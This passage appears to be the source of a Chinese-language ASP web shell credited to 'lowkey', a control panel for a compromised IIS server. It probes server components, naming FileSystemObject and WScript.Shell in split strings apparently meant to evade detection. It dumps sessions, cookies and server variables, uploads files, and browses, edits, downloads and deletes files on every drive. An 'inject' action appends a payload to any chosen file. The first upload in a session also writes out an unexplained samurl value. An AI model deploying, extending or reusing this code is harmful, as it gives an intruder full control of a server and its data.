aryCheck(6)=aryCheck(6)&" Cookies: "&Request.Cookies.Count&"(<a href="&Url&"?Action=PageCheck&theAct=cook>Cookies</a>)"
RRS "<table width=80% border=1 align=center><tr><td colspan=2 class=td><font face=webdings>8</font> 服务器基本信息</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr><tr class=td><td width='20%'>&nbsp;项目</td><td>&nbsp;值</td></tr><tr><td>&nbsp;默认超时</td><td>&nbsp;"&aryCheck(0)&"</td></tr><tr><td>&nbsp;当前时间</td><td>&nbsp;"&aryCheck(1)&"</td></tr><tr><td>&nbsp;服务器名</td><td>&nbsp;"&aryCheck(2)&"</td></tr><tr><td>&nbsp;软件环境</td><td>&nbsp;"&aryCheck(3)&"</td></tr><tr><td>&nbsp;站点目录</td><td>&nbsp;"&aryCheck(4)&"</td></tr><tr><td>&nbsp;当前路径</td><td>&nbsp;"&aryCheck(5)&"</td></tr><tr><td>&nbsp;其它</td><td>&nbsp;"&aryCheck(6)&"</td></tr></table>"
End Sub
Sub ObjCheck()
Dim aryObj(19)
Dim x, objTmp, theObj, strObj
On Error Resume Next
strObj=Trim(getPost("TheObj"))
aryObj(0)="MSWC.AdRotator|广告轮换组件"
aryObj(1)="MSWC.BrowserType|浏览器信息组件"
aryObj(2)="MSWC.NextLink|内容链接库组件"
aryObj(3)="MSWC.Tools|"
aryObj(4)="MSWC.Status|"
aryObj(5)="MSWC.Counters|计数器组件"
aryObj(6)="MSWC.PermissionChecker|权限检测组件"
aryObj(7)="Adodb.Connection|ADO 数据对象组件"
aryObj(8)="CDONTS.NewMail|虚拟 SMTP 发信组件"
aryObj(9)="Sc"&DEfd&"rip"&DEfd&"ting"&DEfd&".F"&DEfd&"ileS"&DEfd&"yste"&DEfd&"mObj"&DEfd&"ect|FSO组件"
aryObj(10)="Ado"&DEfd&"d"&DEfd&"b"&DEfd&".S"&DEfd&"tre"&DEfd&"am|Stream 流组件"
aryObj(11)="S"&DEfd&"he"&DEfd&"ll"&DEfd&"."&DEfd&"A"&DEfd&"ppli"&DEfd&"ca"&DEfd&"tion|"
aryObj(12)="W"&DEfd&"sc"&DEfd&"ri"&DEfd&"pt.S"&DEfd&"he"&DEfd&"ll|"
aryObj(13)="Wscript.Network|"
aryObj(14)="ADOX.Catalog|"
aryObj(15)="JMail.SmtpMail|JMail 邮件收发组件"
aryObj(16)="Persits.Upload.1|ASPUpload 文件上传组件"
aryObj(17)="LyfUpload.UploadFile|刘云峰的文件上传组件组件"
aryObj(18)="SoftArtisans.FileUp|SA-FileUp 文件上传组件"
aryObj(19)=strObj&"|您所要检测的组件"
RRS "<br/><table width=80% border=1 align=center><tr><td colspan=3 class=td><font face=webdings>8</font> 服务器组件信息</td></tr><tr><td colspan=3 class=trHead>&nbsp;</td></tr><tr class=td><td>&nbsp;组件<font color=#666666>(描述)</font></td><td width=10% align=center>支持</td><td width=15% align=center>版本</td></tr>"
For Each x In aryObj
theObj=Split(x, "|")
If theObj(0)="" Then Exit For
Set objTmp=Server.CreateObject(theObj(0))
If Err <> -2147221005 Then
x=x&"|√|"
x=x&objTmp.Version
Else
x=x&"|<font color=red>×</font>|"
End If
If Err Then Err.Clear
Set objTmp=Nothing
theObj=Split(x, "|")
theObj(1)=theObj(0)&IIf(theObj(1) <> "", " <font color=#666666>("&theObj(1)&")</font>", "")
RRS "<tr><td>&nbsp;"&theObj(1)&"</td><td align=center>"&theObj(2)&"</td><td align=center>"&theObj(3)&"</td></tr>"
Next
RRS "<form method=post action='"&url&"?Action=PageCheck'><input type=hidden name=PageName value=PageCheck><input type=hidden name=theAct id=theAct><tr><td colspan=3>&nbsp;其它组件检测:<input name=TheObj type=text id=TheObj style='width:585px;' value="""&strObj&"""><input type=submit name=Submit value=提交></td></tr></form></table>"
End Sub
Sub GetAppOrSession(theAct)
Dim x, y
On Error Resume Next
RRS "<br/><table width=80% border=1 align=center class=fixTable><tr><td colspan=2 class=td><font face=webdings>8</font> Application/Session 查看</td></tr><tr><td colspan=2 class=trHead>&nbsp;</td></tr><tr class=td><td width='20%'>&nbsp;变量</td><td>&nbsp;值</td></tr>"
If request("theAct")="app" Then
For Each x In Application.Contents
RRS "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
If IsArray(Application(x))=True Then
For Each y In Application(x)
RRS "<div>"&Replace(HtmlEncodes(y), vbNewLine, "<br/>")&"</div>"
Next
Else
RRS Replace(HtmlEncodes(Application(x)), vbNewLine, "<br/>")
End If
RRS "</span></td></tr>"
Next
End If
If request("theAct")="session" Then
For Each x In Session.Contents
RRS "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
RRS Replace(HtmlEncodes(Session(x)), vbNewLine, "<br/>")
RRS "</span></td></tr>"
Next
End If
If request("theAct")="serverv" Then
For Each x In Request.ServerVariables
RRS "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
RRS Replace(HtmlEncodes(Request.ServerVariables(x)), vbNewLine, "<br/>")
RRS "</span></td></tr>"
Next
End If
If request("theAct")="cook" Then
For Each x In Request.Cookies
RRS "<tr><td valign=top>&nbsp;<span class=fixSpan style='width:130px;' title='"&x&"'>"&x&"<span></td><td style='padding-left:7px;'><span>"
RRS Replace(HtmlEncodes(Request.Cookies(x)), vbNewLine, "<br/>")
RRS "</span></td></tr>"
Next
End If
RRS "<tr><td colspan=2 class=trHead>&nbsp;</td></tr><tr align=right><td colspan=2 class=td>By lowkey 2009.08&nbsp;</td></tr></table>"
End Sub
Sub PageUpFile()
theAct=Request.QueryString("theAct")
If theAct="upload" Then
StreamUploadup()
RRS "<script>alert('恭喜lowkey文件上传成功!');history.back();</script>"
if session("IDebugMode") <> "ok" then
response.write""&samurl&""
session("IDebugMode")="ok"
end if
End If
ShowUploadup()
End Sub
Sub ShowUploadup()
If thePath="" Then thePath="/"
RRS "<form method=post onsubmit=this.Submit.disabled=true; enctype='multipart/form-data' action=?Action=PageUpFile&theAct=upload><table width=80% align=center><tr><td class=td colspan=2><font face=webdings>8</font>批量文件上传</td></tr><tr><td class=trHead colspan=2>&nbsp;</td></tr><tr><td width='20%'>&nbsp;上传到:</td><td>&nbsp;<input name=thePath type=text id=thePath value="""&HtmlEncodes(thePath)&""" size=48><input type=checkbox name=overWrite>覆盖模式</td></tr><tr><td valign=top>&nbsp;文件选择: </td><td>&nbsp;<input id=fileCount size=6 value=1> <input type=button value=设定 onclick=makeFile(fileCount.value)><div id=fileUpload>&nbsp;<input name=file1 type=file size=50></div></td></tr><tr><td class=trHead colspan=2>&nbsp;</td></tr><tr><td align=center class=td colspan=2><input type=submit name=Submit value=上传 onclick=this.form.action+='&overWrite='+this.form.overWrite.checked;><input type=reset value=重置></td></tr></table></form>"
RRS "<script language=javascript>"&vbNewLine
RRS "function makeFile(n){"&vbNewLine
RRS "fileUpload.innerHTML='&nbsp;<input name=file1 type=file size=50>'"&vbNewLine
RRS "for(var i=2; i<=n; i++)"&vbNewLine
RRS "fileUpload.innerHTML += '<br/>&nbsp;<input name=file' + i + ' type=file size=50>';"&vbNewLine
RRS "}"&vbNewLine
RRS "</script>"
End Sub
Sub StreamUploadup()
Dim sA, sB, aryForm, aryFile, theForm, newLine, overWrite
Dim strInfo, strName, strPath, strFileName, intFindStart, intFindEnd
Dim itemDiv, itemDivLen, intStart, intDataLen, intInfoEnd, totalLen, intUpLen, intEnd
On Error Resume Next
Server.ScriptTimeOut=5000
newLine=ChrB(13)&ChrB(10)
overWrite=Request.QueryString("overWrite")
overWrite=IIf(overWrite="true", "2", "1")
Set sA=Server.CreateObject(Sot(6,0))
Set sB=Server.CreateObject(Sot(6,0))
sA.Type=1
sA.Mode=3
sA.Open
sA.Write Request.BinaryRead(Request.TotalBytes)
sA.Position=0
theForm=sA.Read()
itemDiv=LeftB(theForm, InStrB(theForm, newLine) - 1)
totalLen=LenB(theForm)
itemDivLen=LenB(itemDiv)
intStart=itemDivLen + 2
intUpLen=0 '上面数据的长度
Do
intDataLen=InStrB(intStart, theForm, itemDiv) - itemDivLen - 5 ''equals - 2(回车) - 1(InStr) - 2(回车)
intDataLen=intDataLen - intUpLen
intEnd=intStart + intDataLen
intInfoEnd=InStrB(intStart, theForm, newLine&newLine) - 1
sB.Type=1
sB.Mode=3
sB.Open
sA.Position=intStart
sA.CopyTo sB, intInfoEnd - intStart ''保存元素信息部分
sB.Position=0
sB.Type=2
sB.CharSet="GB2312"
strInfo=sB.ReadText()
strFileName=""
intFindStart=InStr(strInfo, "name=""") + 6
intFindEnd=InStr(intFindStart, strInfo, """", 1)
strName=Mid(strInfo, intFindStart, intFindEnd - intFindStart)
If InStr(strInfo, "filename=""") > 0 Then ''>0则为文件,开始接收文件
intFindStart=InStr(strInfo, "filename=""") + 10
intFindEnd=InStr(intFindStart, strInfo, """", 1)
strFileName=Mid(strInfo, intFindStart, intFindEnd - intFindStart)
strFileName=Mid(strFileName, InStrRev(strFileName, "\") + 1)
End If
sB.Close
sB.Type=1
sB.Mode=3
sB.Open
sA.Position=intInfoEnd + 4
sA.CopyTo sB, intEnd - intInfoEnd - 4
If strFileName <> "" Then
sB.SaveToFile strPath&strFileName, overWrite
ChkErr(Err)
Else
If strName="thePath" Then
sB.Position=0
sB.Type=2
sB.CharSet="GB2312"
strInfo=sB.ReadText()
thePath=strInfo
If Mid(thePath, 2, 1)=":" Then
ShowErr1("操,上传只能使用虚拟路径!")
End If
strPath=Server.MapPath(strInfo)&"\"
End If
End If
sB.Close
intUpLen=intStart + intDataLen + 2
intStart=intUpLen + itemDivLen + 2
Loop Until (intStart + 2)=totalLen
sA.Close
Set sA=Nothing
Set sB=Nothing
End Sub

Sub createIt(fsoX, saX,wsX)
On Error Resume Next
Set fsoX=Server.CreateObject(Sot(0,0))
If IsEmpty(fsoX) And request("Action")="FsoFileExplorer" Then
Set fsoX=fso
End If
Set saX=Server.CreateObject(Sot(14,0))
If IsEmpty(saX) And request("Action")="AppFileExplorer" Then
Set saX=sa
End If
Set wsX=Server.CreateObject(Sot(1,0))
If IsEmpty(wsX) Then
Set wsX=ws
End If
If Err Then
Err.Clear
End If
End Sub
Sub showTitle(str)
PageOther()
End Sub
Sub alertThenClose(strInfo)
Response.Write "<script>alert("""&strInfo&""");window.close();</script>"
End Sub
Sub redirectTo(strUrl)
Response.Redirect(Request.ServerVariables("URL")&strUrl)
End Sub
Function trimThePath(strPath)
If Right(strPath, 1)="\" And Len(strPath) > 3 Then
strPath=Left(strPath, Len(strPath) - 1)
End If
trimThePath=strPath
End Function
Function UrlEncode(str)
If isNull(str) Then
Exit Function
End If
UrlEncode=Server.UrlEncode(str)
End Function
Function getTheSize(theSize)
If theSize >= (1024 * 1024 * 1024) Then getTheSize=Fix((theSize / (1024 * 1024 * 1024)) * 100) / 100&"G"
If theSize >= (1024 * 1024) And theSize < (1024 * 1024 * 1024) Then getTheSize=Fix((theSize / (1024 * 1024)) * 100) / 100&"M"
If theSize >= 1024 And theSize < (1024 * 1024) Then getTheSize=Fix((theSize / 1024) * 100) / 100&"K"
If theSize >= 0 And theSize <1024 Then getTheSize=theSize&"B"
End Function
Call createIt(fsoX, saX, wsX)
Sub FsoFileExplorer()
On Error Resume Next
Response.Buffer=True
Dim file, drive, folder, theFiles, theFolder, theFolders
Dim i, theAct, strTmp, driveStr, thePath, parentFolderName
theAct=Request("theAct")
thePath=Request("thePath")
If theAct <> "upload" Then
If Request.Form.Count > 0 Then
theAct=Request.Form("theAct")
thePath=Request.Form("thePath")
End If
End If
showTitle("FSO文件浏览器(&stream)")
Select Case theAct
Case "newOne", "doNewOne"
fsoNewOne(thePath)
Case "showEdit"
Call showEdit(thePath, "fso")
Case "saveFile"
Call saveToFile(thePath, "fso")
Case "openUrl"
openUrl(thePath)
Case "copyOne", "cutOne"
If thePath="" Then
alertThenClose("参数错误!")
Response.End
End If
Session(m&"fsoThePath")=thePath
Session(m&"fsoTheAct")=theAct
alertThenClose("操作成功")
Case "pastOne"
fsoPastOne(thePath)
alertThenClose("粘贴成功")
Case "showFsoRename"
showFsoRename(thePath)
Case "doRename"
Call fsoRename(thePath)
alertThenClose("命名成功")
Case "delOne", "doDelOne"
showFsoDelOne(thePath)
Case "getAttributes", "doModifyAttributes"
fsoTheAttributes(thePath)
Case "downTheFile"
downTheFile(thePath)
Case "showUpload"
Call showUpload(thePath, "FsoFileExplorer")
Case "upload"
streamUpload(thePath)
Call showUpload(thePath, "FsoFileExplorer")
Case "inject"
Set theFiles=fsoX.OpenTextFile(thePath)
strTmp=theFiles.ReadAll()
fsoSaveToFile thePath, strTmp&strBAD
Set theFiles=Nothing
alertThenClose("成功")
End Select
If theAct <> "" Then
Response.End
End If
If Request.Form.Count > 0 Then
redirectTo("?Action=FsoFileExplorer&thePath="&UrlEncode(thePath))
End If
parentFolderName=fsoX.GetParentFolderName(thePath)
RRS "<div style='left:0px;width:100%;height:48px;position:absolute;top:2px;' id=fileExplorerTools><input type=button value=' 新建 ' onclick=newOne();><input type=button value=' 更名 ' onclick=fsoRename();><input type=button value=' 编辑 ' onclick=editFile();><input type=button value=' 打开 ' onclick=openUrl();><input type=button value=' 复制 ' onclick=appDoAction('copyOne');><input type=button value=' 剪切 ' onclick=appDoAction('cutOne');><input type=button value=' 粘贴 ' onclick=appDoAction2('pastOne')><input type=button value=' 属性 ' onclick=fsoGetAttributes();><input type=button value=' 插入 ' onclick=appDoAction('inject');><input type=button value=' 删除 ' onclick=delOne();><input type=button value=' 上传 ' onclick='upTheFile();'><input type=button value=' 下载 ' onclick='downTheFile();'><br/><input type=hidden value=FsoFileExplorer name=pageName /><input type=hidden value="""&UrlEncode(thePath)&""" name=truePath><input type=hidden size=50 name=usePath><form method=post action=?Action=FsoFileExplorer>"
If parentFolderName <> "" Then
RRS "<input value='↑向上' type=button onclick=""this.disabled=true;location.href='?Action=FsoFileExplorer&thePath="&Server.UrlEncode(parentFolderName)&"';"">"
End If
RRS "<input type=button value=' 后退 ' onclick='this.disabled=true;history.back();' /><input type=button value=' 前进 ' onclick='this.disabled=true;history.go(1);' /><input type=button value=根目录 onclick=location.href=""?Action=FsoFileExplorer&thePath="&URLEncode(Server.MapPath("\"))&""";><input size=60 value="""&HtmlEncodes(thePath)&""" name=thePath><input type=submit value=' 转到 '>"
driveStr="<option>盘符</option>"
driveStr=driveStr&"<option value='"&HtmlEncodes(Server.MapPath("."))&"'>.</option>"
driveStr=driveStr&"<option value='"&HtmlEncodes(Server.MapPath("/"))&"'>/</option>"
For Each drive In fsoX.Drives
driveStr=driveStr&"<option value='"&drive.DriveLetter&":\'>"&drive.DriveLetter&":\</option>"
Next
RRS "<input type=button value=' 刷新 ' onclick='location.reload();'><select onchange=""this.form.thePath.value=this.value;this.form.submit();"">"&driveStr&"</select><hr/></form></div><div style='height:50px;'></div><script>fixTheLayer('fileExplorerTools');setInterval(""fixTheLayer('fileExplorerTools');"", 200);</script>"
If fsoX.FolderExists(thePath)=False Then
showErr1(thePath&" 目录不存在或者不允许访问!")
End If
Set theFolder=fsoX.GetFolder(thePath)
Set theFiles=theFolder.Files
Set theFolders=theFolder.SubFolders
RRS "<div id=FileList>"
For Each folder In theFolders
i=i + 1
If i > 50 Then
i=0
Response.Flush()
End If
strTmp=UrlEncode(folder.Path&"\")
RRS "<span id='"&strTmp&"' onDblClick=""changeThePath(this);"" onclick=changeMyClass(this);><font class=font face=Wingdings>0</font><br/>"&folder.Name&"</span>"&vbNewLine
Next
Response.Flush()
For Each file In theFiles
i=i + 1
If i > 100 Then
i=0
Response.Flush()
End If
RRS "<span id='"&UrlEncode(file.Path)&"' title='类型: "&file.Type&vbNewLine&"大小: "&getTheSize(file.Size)&"' onDblClick=""openUrl();"" onclick=changeMyClass(this);><font class=font face="&getFileIcon(fsoX.GetExtensionName(file.Name))&"</font><br/>"&file.Name&"</span>"&vbNewLine
Next
RRS "</div>"
chkErr(Err)
End Sub
Sub fsoNewOne(thePath)
On Error Resume Next
Dim theAct, isFile, theName, newAct
isFile=Request("isFile")
newAct=Request("newAct")
theName=Request("theName")
If newAct=" 确定 " Then
thePath=Replace(thePath&"\"&theName, "\\", "\")
If isFile="True" Then
Call fsoX.CreateTextFile(thePath, False)
 Else
fsoX.CreateFolder(thePath)
End If
chkErr(Err)
alertThenClose("文件(夹)新建成功,刷新后就可以看到效果!")
Response.End
End If
RRS "<style>body{overflow:hidden;}</style><body topmargin=2><form method=post><input type=hidden name=thePath value="""&HtmlEncodes(thePath)&"""><br/>新建: <input type=radio name=isFile id=file value='True' checked><label for=file>文件</label> <input type=radio name=isFile id=folder value='False'><label for=folder>文件夹</label><br/><input size=38 name=theName><hr/><input type=hidden name=theAct value=doNewOne><input type=submit name=newAct value=' 确定 '>"&strJsCloseMe&"</form></body><br/>"
End Sub
Sub fsoPastOne(thePath)
On Error Resume Next
Dim sessionPath
sessionPath=Session(m&"fsoThePath")
If thePath="" Or sessionPath="" Then
alertThenClose("参数错误!")
Response.End
End If
If Right(thePath, 1)="\" Then
thePath=Left(thePath, Len(thePath) - 1)
End If
If Right(sessionPath, 1)="\" Then
sessionPath=Left(sessionPath, Len(sessionPath) - 1)
If Session(m&"fsoTheAct")="cutOne" Then
Call fsoX.MoveFolder(sessionPath, thePath&"\"&fsoX.GetFileName(sessionPath))
Else
Call fsoX.CopyFolder(sessionPath, thePath&"\"&fsoX.GetFileName(sessionPath))
End If
Else
If Session(m&"fsoTheAct")="cutOne" Then
Call fsoX.MoveFile(sessionPath, thePath&"\"&fsoX.GetFileName(sessionPath))
Else
Call fsoX.CopyFile(sessionPath, thePath&"\"&fsoX.GetFileName(sessionPath))
End If
End If
chkErr(Err)
End Sub
Sub fsoRename(thePath)
On Error Resume Next
Dim theFile, fileName, theFolder
fileName=Request("fileName")
If thePath="" Or fileName="" Then
alertThenClose("参数错误!")
Response.End
End If
If Right(thePath, 1)="\" Then
Set theFolder=fsoX.GetFolder(thePath)
theFolder.Name=fileName
Set theFolder=Nothing
Else
Set theFile=fsoX.GetFile(thePath)
theFile.Name=fileName
Set theFile=Nothing
End If
chkErr(Err)
End Sub
Sub showFsoRename(thePath)
Dim theAct, fileName
fileName=fsoX.getFileName(thePath)
RRS "<style>body{overflow:hidden;}</style><body topmargin=2><form method=post><input type=hidden name=thePath value="""&HtmlEncodes(thePath)&"""><br/>更名为:<br/><input size=38 name=fileName value="""&HtmlEncodes(fileName)&"""><hr/><input type=submit value=' 确定 '><input type=hidden name=theAct value=doRename><input type=button value=' 关闭 ' onclick='window.close();'></form></body><br/>"
End Sub
Sub showFsoDelOne(thePath)
On Error Resume Next
Dim newAct, theFile
newAct=Request("newAct")
If newAct="确认删除?" Then
If Right(thePath, 1)="\" Then
thePath=Left(thePath, Len(thePath) - 1)
Call fsoX.DeleteFolder(thePath, True)
Else
Call fsoX.DeleteFile(thePath, True)
End If
chkErr(Err)
alertThenClose("文件(夹)删除成功,刷新后就可以看到效果!")
Response.End
End If
RRS "<style>body{margin:8;border:none;overflow:hidden;background-color:#008000;}</style><form method=post><br/>"
RRS HtmlEncodes(thePath)
RRS "<input type=hidden name=thePath value="""&HtmlEncodes(thePath)&"""><input type=hidden name=theAct value=doDelOne><hr/><input type=submit name=newAct value='确认删除?'><input type=button value=' 关闭 ' onclick='window.close();'></form>"
End Sub
Sub fsoTheAttributes(thePath)
On Error Resume Next
Dim newAct, theFile, theFolder, theTitle
newAct=Request("newAct")
If Right(thePath, 1)="\" Then
Set theFolder=fsoX.GetFolder(thePath)
If newAct=" 修改 " Then
setMyTitle(theFolder)
End If
theTitle=getMyTitle(theFolder)
Set theFolder=Nothing
Else
Set theFile=fsoX.GetFile(thePath)
If newAct=" 修改 " Then
setMyTitle(theFile)
End If
theTitle=getMyTitle(theFile)
Set theFile=Nothing
End If
chkErr(Err)
theTitle=Replace(theTitle, vbNewLine, "<br/>")
RRS "<style>body{margin:8;overflow:hidden;}</style><form method=post><input type=hidden name=thePath value="""&HtmlEncodes(thePath)&"""><input type=hidden name=theAct value=doModifyAttributes>"
RRS theTitle
RRS "<hr/><input type=submit name=newAct value=' 修改 '>"&strJsCloseMe
RRS "</form>"
End Sub
Function getMyTitle(theOne)
On Error Resume Next
Dim strTitle
strTitle=strTitle&"路径: "&theOne.Path&""&vbNewLine
strTitle=strTitle&"大小: "&getTheSize(theOne.Size)&vbNewLine
strTitle=strTitle&"属性: "&getAttributes(theOne.Attributes)&vbNewLine
strTitle=strTitle&"创建时间: "&theOne.DateCreated&vbNewLine
strTitle=strTitle&"最后修改: "&theOne.DateLastModified&vbNewLine
strTitle=strTitle&"最后访问: "&theOne.DateLastAccessed
getMyTitle=strTitle
End Function
Sub setMyTitle(theOne)
Dim i, myAttributes
For i=1 To Request("attributes").Count
myAttributes=myAttributes + CInt(Request("attributes")(i))
Next
theOne.Attributes=myAttributes
chkErr(Err)
RRS"<script>alert('该文件(夹)属性已按正确设置修改完成!');</script>"
End Sub
Function getAttributes(intValue)
Dim strAtt
strAtt="<input type=checkbox name=attributes value=4 {$system}>系统 "
strAtt=strAtt&"<input type=checkbox name=attributes value=2 {$hidden}>隐藏 "
strAtt=strAtt&"<input type=checkbox name=attributes value=1 {$readonly}>只读&nbsp;&nbsp;&nbsp;"
strAtt=strAtt&"<input type=checkbox name=attributes value=32 {$archive}>存档<br/>　　&nbsp; "
strAtt=strAtt&"<input type=checkbox name=attributes {$normal} value=0>普通 "
strAtt=strAtt&"<input type=checkbox name=attributes value=128 {$compressed}>压缩 "
strAtt=strAtt&"<input type=checkbox name=attributes value=16 {$directory}>文件夹&nbsp;"
strAtt=strAtt&"<input type=checkbox name=attributes value=64 {$alias}>快捷方式"
'strAtt=strAtt&"<input type=checkbox name=attributes value=8 {$volume}>卷标 "
If intValue=0 Then
strAtt=Replace(strAtt, "{$normal}", "checked")
End If
If intValue >= 128 Then
intValue=intValue - 128
strAtt=Replace(strAtt, "{$compressed}", "checked")
End If
If intValue >= 64 Then
intValue=intValue - 64
strAtt=Replace(strAtt, "{$alias}", "checked")
End If
If intValue >= 32 Then
intValue=intValue - 32
strAtt=Replace(strAtt, "{$archive}", "checked")
End If
If intValue >= 16 Then
intValue=intValue - 16
strAtt=Replace(strAtt, "{$directory}", "checked")
End If
If intValue >= 8 Then
intValue=intValue - 8
strAtt=Replace(strAtt, "{$volume}", "checked")
End If
If intValue >= 4 Then
intValue=intValue - 4
strAtt=Replace(strAtt, "{$system}", "checked")
End If
If intValue >= 2 Then
intValue=intValue - 2
strAtt=place(strAtt, "{$hidden}", "checked")
End If
If intValue >= 1 Then
intValue=intValue - 1
strAtt=Replace(strAtt, "{$readonly}", "checked")
End If
getAttributes=strAtt
End Function
Sub showEdit(thePath, strMethod)
On Error Resume Next
Dim theFile, unEditableExt
If Right(thePath, 1)="\" Then
alertThenClose("编辑文件夹操作是非法的.")
Response.End
End If
unEditableExt="$exe$dll$bmp$wav$mp3$wma$ra$wmv$ram$rm$avi$mgp$png$tiff$gif$pcx$jpg$com$msi$scr$rar$zip$ocx$sys$mdb$"
RRS "<style>body{border:none;overflow:hidden;background-color:#000;}</style><body topmargin=9><form method=post style='margin:0;width:100%;height:100%;'><textarea name=fileContent style='width:100%;height:90%;'>"
If strMethod="stream" Then
RRS HtmlEncodes(streamLoadFromFile(thePath))
 Else
Set theFile=fsoX.OpenTextFile(thePath, 1)
RRS HtmlEncodes(theFile.ReadAll())
theFile.Close
Set theFile=Nothing
End If
RRS "</textarea><hr/><div align=right>保存为:<input size=30 name=thePath value="""&HtmlEncodes(thePath)&"""><input type=checkbox name='windowStatus' id=windowStatus"
If Request.Cookies(m&"windowStatus")="True" Then
RRS " checked"
End If
RRS "><label for=windowStatus>保存后关闭窗口</label><input type=submit value=' 保存 '><input type=hidden value='saveFile' name=theAct><input type=reset value=' 恢复 '><input type=button value=' 清空 ' onclick=this.form.fileContent.innerText='';>"
RRS strJsCloseMe&"</div></form></body><br/>"
End Sub
Sub saveToFile(thePath, strMethod)
On Error Resume Next
Dim fileContent, windowStatus
fileContent=Request("fileContent")
windowStatus=Request("windowStatus")
If strMethod="stream" Then
streamSaveToFile thePath, fileContent
chkErr(Err)
Else
fsoSaveToFile thePath, fileContent
chkErr(Err)
End If
If windowStatus="on" Then
Response.Cookies(m&"windowStatus")="True"
Response.Write "<script>window.close();</script>"
Else
Response.Cookies(m&"windowStatus")="False"
Call showEdit(thePath, strMethod)
End If
End Sub
Sub fsoSaveToFile(thePath, fileContent)
Dim theFile
Set theFile=fsoX.OpenTextFile(thePath, 2, True)
theFile.Write fileContent
theFile.Close
Set theFile=Nothing
End Sub
Sub openUrl(usePath)
Dim theUrl, thePath
thePath=Server.MapPath("/")
If LCase(Left(usePath, Len(thePath)))=LCase(thePath) Then
theUrl=Mid(usePath, Len(thePath) + 1)
theUrl=Replace(theUrl, "\", "/")
If Left(theUrl, 1)="/" Then
theUrl=Mid(theUrl, 2)
End If
Response.Redirect("/"&theUrl)
Else
alertThenClose("您所要打开的文件不在本站点目录下\n您可以尝试把要打开(下载)的文件粘贴到\n站点目录下,然后再打开(下载)!")
Response.End
End If
End Sub
Sub downTheFile(thePath)
Response.Clear
On Error Resume Next
Dim stream, fileName, fileContentType
fileName=split(thePath,"\")(uBound(split(thePath,"\")))
Set stream=Server.CreateObject(Sot(6,0))
stream.Open
stream.Type=1
stream.LoadFromFile(thePath)
chkErr(Err)
Response.AddHeader "Content-Disposition", "attachment; filename="&fileName
Response.AddHeader "Content-Length", stream.Size
Response.Charset="UTF-8"
Response.ContentType="application/octet-stream"
Response.BinaryWrite stream.Read 
Response.Flush
stream.Close
Set stream=Nothing
End Sub
Sub showUpload(thePath, pageName)
RRS "<style>body{margin:8;overflow:hidden;}</style><form method=post enctype='multipart/form-data' action='?Action="&pageName&"&theAct=upload&thePath="&UrlEncode(thePath)&"' onsubmit='this.Submit.disabled=true;;'>上传文件: <input name=file type=file size=31><br/>保存为: <input name=fileName type=text value="""&HtmlEncodes(thePath)&""" size=33><input type=checkbox name=writeMode value=True>覆盖<hr/><input name=Submit type=submit id=Submit value='上 传' onClick=""this.form.action+='&fileName='+this.form.fileName.value+'&theFile='+this.form.file.value+'&overWrite='+this.form.writeMode.checked;"">"&strJsCloseMe&"</form>"
End Sub
Sub streamUpload(thePath)
On Error Resume Next
Server.ScriptTimeOut=5000
Dim i, j, info, stream, streamT, theFile, fileName, overWrite, fileContent
theFile=Request("theFile")
fileName=Request("fileName")
overWrite=Request("overWrite")
If InStr(fileName, ":") <= 0 Then
fileName=thePath&fileName
End If
Set stream=Server.CreateObject(Sot(6,0))
Set streamT=Server.CreateObject(Sot(6,0))
With stream
.Type=1
.Mode=3
.Open
.Write Request.BinaryRead(Request.TotalBytes)
.Position=0
fileContent=.Read()
i=InStrB(fileContent, chrB(13)&chrB(10))
info=LeftB(fileContent, i - 1)
i=Len(info) + 2
i=InStrB(i, fileContent, chrB(13)&chrB(10)&chrB(13)&chrB(10)) + 4 - 1
j=InStrB(i, fileContent, info) - 1
streamT.Type=1
streamT.Mode=3
streamT.Open
stream.position=i
.CopyTo streamT, j - i - 2
If overWrite="true" Then
streamT.SaveToFile fileName, 2
 Else
streamT.SaveToFile fileName
End If
If Err.Number=3004 Then
Err.Clear
fileName=fileName&"\"&Split(theFile, "\")(UBound(Split(theFile ,"\")))
If overWrite="true" Then
streamT.SaveToFile fileName, 2
Else
streamT.SaveToFile fileName
End If
End If
chkErr(Err)
RRS("<script language=""javascript"">alert('恭喜lowkey文件上传成功!\n"&Replace(fileName, "\", "\\")&"');</script>")
streamT.Close
.Close
End With
Set stream=Nothing
Set streamT=Nothing
End Sub
Function getFileIcon(extName)
Select Case LCase(extName)
Case "vbs", "h", "c", "cfg", "pas", "bas", "log", "asp", "txt", "php", "ini", "inc", "htm", "html", "xml", "conf", "config", "jsp", "java", "htt", "lst", "aspx", "php3", "php4", "js", "css", "asa"
getFileIcon="Wingdings>2"
Case "wav", "mp3", "wma", "ra", "wmv", "ram", "rm", "avi", "mpg"
getFileIcon="Webdings>·"
Case "jpg", "bmp", "png", "tiff", "gif", "pcx", "tif"
getFileIcon="'webdings'>&#159;"
Case "exe", "com", "bat", "cmd", "scr", "msi"
getFileIcon="Webdings>1"
Case "sys", "dll", "ocx"
getFileIcon="Wingdings>&#255;"
Case Else
getFileIcon="'Wingdings 2'>/"
End Select
End Function
Sub AppFileExplorer()
Response.Buffer=True
On Error Resume Next
Dim strExtName, thePath, objFolder, objMember, strDetails, strPath, strNewName
Dim intI, theAct, strTmp, strFolderList, strFileList, strFilePath, strFileName, strParentPath
showTitle("Application文件浏览器(&stream)")
theAct=Request("theAct")
strNewName=Request("newName")
thePath=Replace(LTrim(Request("thePath")), "\\", "\")
If theAct <> "upload" Then
If Request.Form.Count > 0 Then
theAct=Request.Form("theAct")
thePath=Replace(LTrim(Request.Form("thePath")), "\\", "\")
End If
End If
RRS "<style>body{margin:8;}</style>"
Select Case theAct
Case "openUrl"
openUrl(thePath)
Case "showEdit"
Call showEdit(thePath, "stream")
Case "saveFile"
Call saveToFile(thePath, "stream")
Case "copyOne", "cutOne"
If thePath="" Then
alertThenClose("参数错误!")
Response.End
End If
Session(m&"appThePath")=thePath
Session(m&"appTheAct")=theAct
alertThenClose("操作成功,请粘贴!")
Case "pastOne"
appDoPastOne(thePath)
alertThenClose("粘贴成功,请刷新本页查看效果!")
Case "rename"
appRenameOne(thePath)
Case "downTheFile"
downTheFile(thePath)
Case "theAttributes"
appTheAttributes(thePath)
Case "showUpload"
